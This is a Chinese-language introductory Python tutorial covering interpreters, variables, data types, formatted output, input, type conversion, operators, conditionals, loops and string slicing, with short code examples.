<p>和C/C++这类完全编译语言相比，Python的工作中没有 “build” 和 “make” 操作，也就是没有将源码编译成可以直接在机器上运行的二进制代码的过程。而且Python解释器中间形成的<strong>字节码并不是CPU可以直接运行的二进制代码，PVM仍然需要解释字节码成为二进制码，再交由CPU运行</strong>。所以Python代码无法运行的像C/C++一样快。</p>
<p>在程序开始执行之前不需要预编译和连接，只需要简单的输入并运行代码即可，这使得开发周期大大缩短。这同样使得Python具有更多的动态语言特性：在运行时，Python程序可以去构建并执行另一个Python程序，而且往往非常的方便。</p>
<h2 id="1-3-python-解释器分类"><a href="#1-3-python-解释器分类" class="headerlink" title="1.3 python 解释器分类"></a>1.3 python 解释器分类</h2><ul>
<li>CPython：C语言开发，使用最广，默认的解释器</li>
<li>IPython：基于CPython之上的交互式解释器</li>
<li>PyPy：采用JIT(Just In Time, 即时编译)技术，对python代码进行动态编译，追求执行速度</li>
<li>Jython：运行在Java平台上的解释器，可以直接编译成Java字节码执行</li>
<li>IronPython：同理Jython，运行在 .Net 平台上</li>
</ul>
<h1 id="2-变量和数据类型"><a href="#2-变量和数据类型" class="headerlink" title="2. 变量和数据类型"></a>2. 变量和数据类型</h1><h2 id="2-1-注释"><a href="#2-1-注释" class="headerlink" title="2.1 注释"></a>2.1 注释</h2><p>解释器不执行注释内容</p>
<ol>
<li><p>单行注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注释内容</span></span><br></pre></td></tr></table></figure></li>
<li><p>多行注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">  注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="2-2-变量"><a href="#2-2-变量" class="headerlink" title="2.2 变量"></a>2.2 变量</h2><blockquote>
<p>变量名 = 值</p>
</blockquote>
<h3 id="2-2-1-标识符"><a href="#2-2-1-标识符" class="headerlink" title="2.2.1 标识符"></a>2.2.1 标识符</h3><p>变量名要满足标识符的规则</p>
<ul>
<li>由数字、字⺟、下划线组成</li>
<li>不能数字开头</li>
<li>不能使⽤内置关键字</li>
<li>严格区分⼤⼩写</li>
</ul>
<h3 id="2-2-2-命名习惯"><a href="#2-2-2-命名习惯" class="headerlink" title="2.2.2 命名习惯"></a>2.2.2 命名习惯</h3><ul>
<li>⻅名知义。</li>
<li>⼤驼峰：即每个单词⾸字⺟都⼤写，例如： MyName 。</li>
<li>⼩驼峰：第⼆个（含）以后的单词⾸字⺟⼤写，例如： myName 。</li>
<li>下划线：例如： my_name 。</li>
</ul>
<h2 id="2-2-3-数据类型"><a href="#2-2-3-数据类型" class="headerlink" title="2.2.3 数据类型"></a>2.2.3 数据类型</h2><ul>
<li>数值</li>
<li>布尔型</li>
<li>str（字符串）</li>
<li>list（列表）</li>
<li>tuple（元组）</li>
<li>set（集合）</li>
<li>dict（字典）<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a)) <span class="comment"># &lt;class &#x27;int&#x27;&gt; -- 整型</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">1.1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(b)) <span class="comment"># &lt;class &#x27;float&#x27;&gt; -- 浮点型</span></span><br><span class="line"></span><br><span class="line">c = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(c)) <span class="comment"># &lt;class &#x27;bool&#x27;&gt; -- 布尔型</span></span><br><span class="line"></span><br><span class="line">d = <span class="string">&#x27;12345&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(d)) <span class="comment"># &lt;class &#x27;str&#x27;&gt; -- 字符串</span></span><br><span class="line"></span><br><span class="line">e = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(e)) <span class="comment"># &lt;class &#x27;list&#x27;&gt; -- 列表</span></span><br><span class="line"></span><br><span class="line">f = (<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(f)) <span class="comment"># &lt;class &#x27;tuple&#x27;&gt; -- 元组</span></span><br><span class="line"></span><br><span class="line">h = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(h)) <span class="comment"># &lt;class &#x27;set&#x27;&gt; -- 集合</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a)) <span class="comment"># &lt;class &#x27;int&#x27;&gt; -- 整型</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">1.1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(b)) <span class="comment"># &lt;class &#x27;float&#x27;&gt; -- 浮点型</span></span><br><span class="line"></span><br><span class="line">c = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(c)) <span class="comment"># &lt;class &#x27;bool&#x27;&gt; -- 布尔型</span></span><br><span class="line"></span><br><span class="line">d = <span class="string">&#x27;12345&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(d)) <span class="comment"># &lt;class &#x27;str&#x27;&gt; -- 字符串</span></span><br><span class="line"></span><br><span class="line">e = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(e)) <span class="comment"># &lt;class &#x27;list&#x27;&gt; -- 列表</span></span><br><span class="line"></span><br><span class="line">f = (<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(f)) <span class="comment"># &lt;class &#x27;tuple&#x27;&gt; -- 元组</span></span><br><span class="line"></span><br><span class="line">h = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(h)) <span class="comment"># &lt;class &#x27;set&#x27;&gt; -- 集合</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="3-输入输出"><a href="#3-输入输出" class="headerlink" title="3. 输入输出"></a>3. 输入输出</h1><h2 id="3-1-输出"><a href="#3-1-输出" class="headerlink" title="3.1 输出"></a>3.1 输出</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello Python&#x27;</span>)</span><br><span class="line">age = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(age)</span><br></pre></td></tr></table></figure>
<h3 id="3-1-1-格式化输出"><a href="#3-1-1-格式化输出" class="headerlink" title="3.1.1 格式化输出"></a>3.1.1 格式化输出</h3><table>
<thead>
<tr>
<th>格式符号</th>
<th>转换</th>
</tr>
</thead>
<tbody><tr>
<td>%s</td>
<td>字符串</td>
</tr>
<tr>
<td>%d</td>
<td>有符号的⼗进制整数</td>
</tr>
<tr>
<td>%f</td>
<td>浮点数</td>
</tr>
<tr>
<td>%c</td>
<td>字符</td>
</tr>
<tr>
<td>%u</td>
<td>⽆符号⼗进制整数</td>
</tr>
<tr>
<td>%o</td>
<td>⼋进制整数</td>
</tr>
<tr>
<td>%x</td>
<td>⼗六进制整数（⼩写ox）</td>
</tr>
<tr>
<td>%X</td>
<td>⼗六进制整数（⼤写OX）</td>
</tr>
<tr>
<td>%e</td>
<td>科学计数法（⼩写’e’）</td>
</tr>
<tr>
<td>%E</td>
<td>科学计数法（⼤写’E’）</td>
</tr>
<tr>
<td>%g</td>
<td>%f和%e的简写</td>
</tr>
<tr>
<td>%G</td>
<td>%f和%E的简写</td>
</tr>
</tbody></table>
<ul>
<li>%06d，表示输出的整数显示位数，不⾜以0补全，超出当前位数则原样输出</li>
<li>%.2f，表示⼩数点后显示的⼩数位数。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br><span class="line">name = <span class="string">&#x27;TOM&#x27;</span></span><br><span class="line">weight = <span class="number">75.5</span></span><br><span class="line">student_id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的名字是TOM</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的名字是%s&#x27;</span> % name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的学号是0001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的学号是%4d&#x27;</span> % student_id)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的体重是75.50公⽄</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的体重是%.2f公⽄&#x27;</span> % weight)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的名字是TOM，今年18岁了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的名字是%s，今年%d岁了&#x27;</span> % (name, age))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的名字是TOM，明年19岁了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的名字是%s，明年%d岁了&#x27;</span> % (name, age + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的名字是TOM，明年19岁了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;我的名字是<span class="subst">&#123;name&#125;</span>, 明年<span class="subst">&#123;age + <span class="number">1</span>&#125;</span>岁了&#x27;</span>)</span><br><span class="line"><span class="comment"># f-格式化字符串是Python3.6中新增的格式化⽅法，该⽅法更简单易读。</span></span><br></pre></td></tr></table></figure>

<h3 id="3-1-2-转义字符"><a href="#3-1-2-转义字符" class="headerlink" title="3.1.2 转义字符"></a>3.1.2 转义字符</h3><p>转义字符在书写形式上由多个字符组成，但 Python 将它们看作是一个整体，表示一个字符。<br>| 转义字符 | 说明 |<br>| — | — |<br>| \n | 换行符，将光标位置移到下一行开头。 |<br>| \r | 回车符，将光标位置移到本行开头。 |<br>| \t | 水平制表符，也即 Tab 键，一般相当于四个空格。 |<br>| \a | 蜂鸣器响铃。注意不是喇叭发声，现在的计算机很多都不带蜂鸣器了，所以响铃不一定有效。 |<br>| \b | 退格（Backspace），将光标位置移到前一列。 |<br>| \ | 反斜线 |<br>| &#39; | 单引号 |<br>| &quot; | 双引号 |<br>| \    | 在字符串行尾的续行符，即一行未完，转到下一行继续写。 |</p>
<h3 id="3-1-3-结束符"><a href="#3-1-3-结束符" class="headerlink" title="3.1.3 结束符"></a>3.1.3 结束符</h3><p>在Python中，print()， 默认⾃带 end=”\n” 这个换⾏结束符，可以按需求更改结束符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;内容&#x27;</span>, end=<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="3-2-输入"><a href="#3-2-输入" class="headerlink" title="3.2 输入"></a>3.2 输入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input_message = <span class="built_in">input</span>(<span class="string">&quot;提示信息:&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="3-2-1-特点"><a href="#3-2-1-特点" class="headerlink" title="3.2.1 特点"></a>3.2.1 特点</h3><ul>
<li>当程序执⾏到 input ，等待⽤户输⼊，输⼊完成之后才继续向下执⾏。</li>
<li>⼀般将input接收的数据存储到变量，⽅便使⽤。</li>
<li>input接收的任何数据默认都是<strong>字符串</strong>类型<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">password = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您的密码：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的密码是<span class="subst">&#123;password&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(password)) <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="4-转换数据类型和运算符"><a href="#4-转换数据类型和运算符" class="headerlink" title="4. 转换数据类型和运算符"></a>4. 转换数据类型和运算符</h1><h2 id="4-1-转换数据类型的函数"><a href="#4-1-转换数据类型的函数" class="headerlink" title="4.1 转换数据类型的函数"></a>4.1 转换数据类型的函数</h2><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>int(x [,base ])</td>
<td>将x转换为⼀个整数</td>
</tr>
<tr>
<td>float(x )</td>
<td>将x转换为⼀个浮点数</td>
</tr>
<tr>
<td>complex(real [,imag ])</td>
<td>创建⼀个复数，real为实部，imag为虚部</td>
</tr>
<tr>
<td>str(x )</td>
<td>将对象 x 转换为字符串</td>
</tr>
<tr>
<td>repr(x )</td>
<td>将对象 x 转换为表达式字符串</td>
</tr>
<tr>
<td>eval(str )</td>
<td>⽤来计算在字符串中的有效Python表达式,并返回⼀个对象</td>
</tr>
<tr>
<td>tuple(s )</td>
<td>将序列 s 转换为⼀个元组</td>
</tr>
<tr>
<td>list(s )</td>
<td>将序列 s 转换为⼀个列表</td>
</tr>
<tr>
<td>chr(x )</td>
<td>将⼀个整数转换为⼀个Unicode字符</td>
</tr>
<tr>
<td>ord(x )</td>
<td>将⼀个字符转换为它的ASCII整数值</td>
</tr>
<tr>
<td>hex(x )</td>
<td>将⼀个整数转换为⼀个⼗六进制字符串</td>
</tr>
<tr>
<td>oct(x )</td>
<td>将⼀个整数转换为⼀个⼋进制字符串</td>
</tr>
<tr>
<td>bin(x )</td>
<td>将⼀个整数转换为⼀个⼆进制字符串</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. float() -- 转换成浮点型</span></span><br><span class="line">num1 = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(num1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">float</span>(num1)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. str() -- 转换成字符串类型</span></span><br><span class="line">num2 = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">str</span>(num2)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. tuple() -- 将⼀个序列转换成元组</span></span><br><span class="line">list1 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(list1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">tuple</span>(list1)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. list() -- 将⼀个序列转换成列表</span></span><br><span class="line">t1 = (<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(t1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">list</span>(t1)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. eval() -- 将字符串中的数据转换成Python表达式原本类型</span></span><br><span class="line">str1 = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;[1, 2, 3]&#x27;</span></span><br><span class="line">str3 = <span class="string">&#x27;(1000, 2000, 3000)&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">eval</span>(str1)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">eval</span>(str2)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">eval</span>(str3)))</span><br></pre></td></tr></table></figure>

<h2 id="4-2-运算符"><a href="#4-2-运算符" class="headerlink" title="4.2 运算符"></a>4.2 运算符</h2><h3 id="4-2-1-算数运算符"><a href="#4-2-1-算数运算符" class="headerlink" title="4.2.1 算数运算符"></a>4.2.1 算数运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加</td>
<td>1 + 1 输出结果为 2</td>
</tr>
<tr>
<td>-</td>
<td>减</td>
<td>1-1 输出结果为 0</td>
</tr>
<tr>
<td>*</td>
<td>乘</td>
<td>2 * 2 输出结果为 4</td>
</tr>
<tr>
<td>/</td>
<td>除</td>
<td>10 / 2 输出结果为 5</td>
</tr>
<tr>
<td>//</td>
<td>整除</td>
<td>9 // 4 输出结果为2</td>
</tr>
<tr>
<td>%</td>
<td>取余</td>
<td>9 % 4 输出结果为 1</td>
</tr>
<tr>
<td>**</td>
<td>指数</td>
<td>2 ** 4 输出结果为 16，即 2 * 2 * 2 * 2</td>
</tr>
<tr>
<td>()</td>
<td>⼩括号</td>
<td>⼩括号⽤来提⾼运算优先级，即 (1 + 2) * 3 输出结果为 9</td>
</tr>
<tr>
<td>优先级顺序： () ⾼于 ** ⾼于 * / // % ⾼于 + -</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="4-2-2-赋值运算符"><a href="#4-2-2-赋值运算符" class="headerlink" title="4.2.2 赋值运算符"></a>4.2.2 赋值运算符</h3><ul>
<li>单个变量赋值<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li>多个变量赋值<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num1, float1, str1 = <span class="number">10</span>, <span class="number">0.5</span>, <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">num = <span class="number">10</span> </span><br><span class="line">float1 = <span class="number">0.5</span></span><br><span class="line">str1 = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line">a = b = <span class="number">10</span> <span class="comment"># 多变量赋相同值</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-2-3-复合赋值运算符"><a href="#4-2-3-复合赋值运算符" class="headerlink" title="4.2.3  复合赋值运算符"></a>4.2.3  复合赋值运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+=</td>
<td>加法赋值运算符</td>
<td>c += a 等价于 c = c + a</td>
</tr>
<tr>
<td>-=</td>
<td>减法赋值运算符</td>
<td>c -= a 等价于 c = c- a</td>
</tr>
<tr>
<td>*=</td>
<td>乘法赋值运算符</td>
<td>c *= a 等价于 c = c * a</td>
</tr>
<tr>
<td>/=</td>
<td>除法赋值运算符</td>
<td>c /= a 等价于 c = c / a</td>
</tr>
<tr>
<td>//=</td>
<td>整除赋值运算符</td>
<td>c //= a 等价于 c = c // a</td>
</tr>
<tr>
<td>%=</td>
<td>取余赋值运算符</td>
<td>c %= a 等价于 c = c % a</td>
</tr>
<tr>
<td>**=</td>
<td>幂赋值运算符</td>
<td>c ** = a 等价于 c = c ** a</td>
</tr>
</tbody></table>
<h3 id="4-2-4-比较运算符"><a href="#4-2-4-比较运算符" class="headerlink" title="4.2.4 比较运算符"></a>4.2.4 比较运算符</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">7</span></span><br><span class="line">b = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(a == b) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(a != b) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(a &lt; b) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(a &gt; b) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(a &lt;= b) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(a &gt;= b) <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<h3 id="4-2-5-逻辑运算符"><a href="#4-2-5-逻辑运算符" class="headerlink" title="4.2.5 逻辑运算符"></a>4.2.5 逻辑运算符</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与</span></span><br><span class="line"><span class="built_in">print</span>((a &lt; b) <span class="keyword">and</span> (b &lt; c)) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>((a &gt; b) <span class="keyword">and</span> (b &lt; c)) <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">print</span>((a &gt; b) <span class="keyword">or</span> (b &lt; c)) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 非</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> (a &gt; b)) <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<h1 id="5-条件语句"><a href="#5-条件语句" class="headerlink" title="5. 条件语句"></a>5. 条件语句</h1><h2 id="5-1-语法"><a href="#5-1-语法" class="headerlink" title="5.1 语法"></a>5.1 语法</h2><ul>
<li><p>if 语句语法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    条件成⽴执⾏的代码</span><br></pre></td></tr></table></figure></li>
<li><p>if…else…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    条件成⽴执⾏的代码</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    条件不成⽴执⾏的代码</span><br></pre></td></tr></table></figure></li>
<li><p>多重判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    条件<span class="number">1</span>成⽴执⾏的代码</span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>:</span><br><span class="line">    条件<span class="number">2</span>成⽴执⾏的代码</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    以上条件都不成⽴执⾏的代码</span><br></pre></td></tr></table></figure></li>
<li><p>if嵌套</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    条件<span class="number">1</span>成⽴执⾏的代码</span><br><span class="line">    <span class="keyword">if</span> 条件<span class="number">2</span>:</span><br><span class="line">        条件<span class="number">2</span>成⽴执⾏的代码</span><br><span class="line"> </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5-2-三元运算符"><a href="#5-2-三元运算符" class="headerlink" title="5.2 三元运算符"></a>5.2 三元运算符</h2><p>语法</p>
<blockquote>
<p>条件成⽴执⾏的表达式 if 条件 else 条件不成⽴执⾏的表达式</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> b</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>

<h1 id="6-循环"><a href="#6-循环" class="headerlink" title="6. 循环"></a>6. 循环</h1><h2 id="6-1-while-循环"><a href="#6-1-while-循环" class="headerlink" title="6.1 while 循环"></a>6.1 while 循环</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">100</span>:</span><br><span class="line">    result += i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="comment"># 输出5050</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="6-2-for-循环"><a href="#6-2-for-循环" class="headerlink" title="6.2 for 循环"></a>6.2 for 循环</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;12345678&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<h2 id="6-3-break-continue-else"><a href="#6-3-break-continue-else" class="headerlink" title="6.3 break, continue, else"></a>6.3 break, continue, else</h2><ul>
<li>break：直接退出循环</li>
<li>continue：跳过当前轮循环continue后代码，直接进行下一轮（计数器+1）</li>
<li>else<ul>
<li>while和for都可以配合else使⽤</li>
<li>else下⽅缩进的代码含义：当循环正常结束后执⾏的代码</li>
<li><strong>break终⽌循环不会执⾏else下⽅缩进的代码</strong></li>
<li><strong>continue退出循环的⽅式执⾏else下⽅缩进的代码</strong></li>
</ul>
</li>
</ul>
<h1 id="7-字符串"><a href="#7-字符串" class="headerlink" title="7. 字符串"></a>7. 字符串</h1><h2 id="7-1-认识字符串"><a href="#7-1-认识字符串" class="headerlink" title="7.1 认识字符串"></a>7.1 认识字符串</h2><h3 id="7-1-1-语法"><a href="#7-1-1-语法" class="headerlink" title="7.1.1 语法"></a>7.1.1 语法</h3><p>⼀般使⽤引号来创建字符串。</p>
<ul>
<li>一对引号字符串<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">b = <span class="string">&quot;abcdefg&quot;</span></span><br></pre></td></tr></table></figure></li>
<li>三引号字符串<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name3 = <span class="string">&#x27;&#x27;&#x27; Tom &#x27;&#x27;&#x27;</span></span><br><span class="line">name4 = <span class="string">&quot;&quot;&quot; Rose &quot;&quot;&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27; i am Tom,</span></span><br><span class="line"><span class="string">    nice to meet you! &#x27;&#x27;&#x27;</span></span><br><span class="line">b = <span class="string">&quot;&quot;&quot; i am Rose,</span></span><br><span class="line"><span class="string">    nice to meet you! &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li>
<li>特殊字符的使用<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&quot;I&#x27;m Tom&quot;</span></span><br><span class="line">d = <span class="string">&#x27;I\&#x27;m Tom&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="7-1-2-字符串输出"><a href="#7-1-2-字符串输出" class="headerlink" title="7.1.2 字符串输出"></a>7.1.2 字符串输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">name = <span class="string">&#x27;Tom&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的名字是%s&#x27;</span> % name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;我的名字是<span class="subst">&#123;name&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="7-1-3-字符串输入"><a href="#7-1-3-字符串输入" class="headerlink" title="7.1.3 字符串输入"></a>7.1.3 字符串输入</h3>在Python中，使⽤ input() 接收⽤户输⼊。默认接收为字符串类型。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您的名字：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的名字是<span class="subst">&#123;name&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(name))</span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您的密码：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的密码是<span class="subst">&#123;password&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(password))</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="7-2-下标"><a href="#7-2-下标" class="headerlink" title="7.2 下标"></a>7.2 下标</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;abcdef&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">1</span>]) <span class="comment"># b</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>]) <span class="comment"># a</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">2</span>]) <span class="comment"># c</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>下标从 0 开始</p>
</blockquote>
<h2 id="7-3-切片"><a href="#7-3-切片" class="headerlink" title="7.3 切片"></a>7.3 切片</h2><p>切⽚是指对操作的对象截取其中⼀部分的操作。<strong>字符串、列表、元组都⽀持切⽚操作</strong>。</p>
<h3 id="7-3-1-语法"><a href="#7-3-1-语法" class="headerlink" title="7.3.1 语法"></a>7.3.1 语法</h3><blockquote>
<p>序列[开始位置下标:结束位置下标:步⻓]</p>
<ul>
<li>不包含结束位置下标对应的数据， 正负整数均可；（左闭右开[)）</li>
<li>步⻓是选取间隔，正负整数均可，默认步⻓为1。</li>
</ul>
</blockquote>
